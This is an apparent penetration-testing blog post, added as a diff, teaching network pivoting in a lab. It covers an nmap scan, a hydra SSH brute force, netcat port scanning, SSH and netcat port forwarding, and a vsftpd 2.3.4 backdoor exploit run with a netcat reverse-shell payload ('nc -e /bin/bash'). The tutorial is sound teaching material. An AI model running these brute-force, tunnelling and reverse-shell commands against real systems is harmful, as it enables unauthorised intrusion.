@@ -1,0 +1,170 @@
+---
+title:  "Pivoting - part 1. Practical example"
+date:   2021-11-04 10:00:00 +0600
+header:
+  teaser: "/assets/images/19/2021-11-05_02-02.png"
+categories: 
+  - pentest
+tags:
+  - pivoting
+  - red team
+  - networking
+  - pentest
+---
+
+﷽
+
+Hello, cybersecurity enthusiasts and white hackers!           
+
+![pivoting 1](/assets/images/19/2021-11-05_02-02.png){:class="img-responsive"}         
+
+This article will consider scenarios for attacking protected segments of a corporate network using pivoting techniques. I will focus on a practical example.        
+
+### Pivoting
+
+Pivoting is a technique by which access is organized to those networks to which we do not have access under normal circumstances and obtained using compromised computers. Network isolation will be useless if we compromise a host that has access to all isolated subnets. Thus, an attacker can use the routing capabilities of a compromised machine to access internal corporate resources.            
+
+I will show with an example how an attacker can gain access to a "hidden" network without having direct access to it in the early stages of penetration testing using pivot techniques.       
+
+### Scenario
+
+Let's consider at this network topology:       
+
+![pivoting 1](/assets/images/19/pivot-topology.png){:class="img-responsive"}         
+
+### enum and compromise machine A
+
+Firstly, scan ports:          
+```bash
+nmap -Pn -sV 10.9.1.11
+```
+
+![machine A 1](/assets/images/19/2021-05-31_11-56.png){:class="img-responsive"}         
+
+As you can see SSH port `22` is open.     
+
+Let's go to brute via `hydra`:        
+```bash
+hydra -f -v -V -l root -P rockyou-15.txt -s 22 ssh://10.9.1.11 -t 2
+```
+
+![machine A 2](/assets/images/19/2021-05-31_12-26.png){:class="img-responsive"}         
+
+### ssh port forward
+
+Check network interfaces on machine `A`:        
+```bash
+ifconfig
+```
+
+![machine A 3](/assets/images/19/2021-05-31_11-59.png){:class="img-responsive"}         
+
+As you can see we discover another network `7.7.1.0/24`.
+
+Further, according to the scenario, the attacker wants to gain access to the subnet behind the `7.7.7.0/24` interface. To do this, he needs to use a compromised host as a pivot.     
+
+In a compromised host, we cannot use `nmap` for port scanning, so use `netcat`:      
+```bash
+nc -zv -w1 7.7.1.5 1-100
+```
+
+![machine A 4](/assets/images/19/2021-05-31_13-03.png){:class="img-responsive"}         
+
+then banner grabbling via netcat:
+```bash
+nc 7.7.1.5 21
+```
+
+![machine A 5](/assets/images/19/2021-05-31_13-09.png){:class="img-responsive"}         
+
+We found a vulnerable `21` port:     
+
+[https://www.exploit-db.com/exploits/49757](https://www.exploit-db.com/exploits/49757)
+
+for exploitation `7.7.1.5` we use ssh tunnel:             
+
+```bash
+ssh -L 10.9.1.6:8021:7.7.1.5:21 -L 10.9.1.6:6200:7.7.1.5:6200 root@10.9.1.11
+```
+
+![machine A 6](/assets/images/19/2021-05-31_11-57.png){:class="img-responsive"}         
+
+So what we do in here? We forwarded ports from attacker's machine to victim machine `B` via compromised machine `A` - `10.9.1.11`:      
+
+![SSH tunnel](/assets/images/19/tunnel.png){:class="img-responsive"}         
+
+Why `6200` port? Because, backdoor use this port.        
+
+
+### exploit and access machine B
+
+For exploitation machine `B` with address `7.7.1.5`, we'll download python exploit for `vsftpd 2.3.4` backdoor:             
+[https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py](https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py)           
+
+Download and run:
+```bash
+python3 vsftpd_234_exploit.py 10.9.1.6 8021 whoami
+```
+
+![machine B 1](/assets/images/19/2021-05-31_12-00.png){:class="img-responsive"}         
+
+It's ok, but we cannot start the reverse shell because we do not have a reverse route.     
+
+create back port forwarding for our reverse shell.
+
+on machine `A` run:
+```bash
+nc -l -p 3333 -c "nc 10.9.1.6 3333"
+```
+
+![machine B 2](/assets/images/19/2021-05-31_11-59_1.png){:class="img-responsive"}         
+
+and prepare listener on attacker machine:
+```bash
+nc -nlvp 3333
+```
+
+![machine B 3](/assets/images/19/2021-05-31_12-01_1.png){:class="img-responsive"}         
+
+So what we do in here? Port forwarding is one of the basic steps during tunneling. This technique is used when the service within the detected network is not directly accessible. This is because our routing is unidirectional. We know how to access the internal service, but the service does not have an appropriate route to the attacker's machine. Therefore, we will redirect the all incoming connections to `3333` port from machine `A` to attacker's machine (on `3333` port):    
+
+![netcat forward](/assets/images/19/netcat_fwd.png){:class="img-responsive"}         
+
+
+on attacker machine run exploit with netcat reverse shell:
+```bash
+python3 vsftpd_234_exploit.py 10.9.1.6 8021 "nc -e /bin/bash 7.7.1.9 3333"
+```
+
+![machine B 4](/assets/images/19/2021-05-31_12-01.png){:class="img-responsive"}         
+
+![rev](/assets/images/19/rev.png){:class="img-responsive"}         
+
+
+check our listener:         
+
+![machine B 5](/assets/images/19/2021-05-31_12-01_2.png){:class="img-responsive"}         
+
+![machine B 6](/assets/images/19/2021-05-31_12-02.png){:class="img-responsive"}         
+
+**So, the machine B has been pnwed :)**
+
+### conclusion
+
+The attacker discovered secret network by following the steps below:              
+
+- attacker got an access to the `machine A (10.9.1.11)`  which was on same network with attacker via brute `SSH` via `hydra`              
+- then he realise that `machine A` has 2 network interfaces           
+- scan ports on `machine B` via `nc` from `machine A`                
+- then attacker banner grabbling on port `21` on `machine B` with IP address `7.7.1.5`         
+- `machine B` have vulnerable `vsftpd 2.3.4` on port `21`              
+- reverse port forward via `nc` on `A` for back connect from `B` to attacker machine    
+- successfully exploitation of `vsftpd 2.3.4` via python exploit - create reverse shell via `3333` port    
+- final    
+
+In the next part I will go to consider an example which use `proxychains` and `metasploit` for pivoting.          
+
+> This is a practical case for educational purposes only.      
+
+Thanks for your time, happy hacking and good bye!    
+*PS. All drawings and screenshots are mine*             
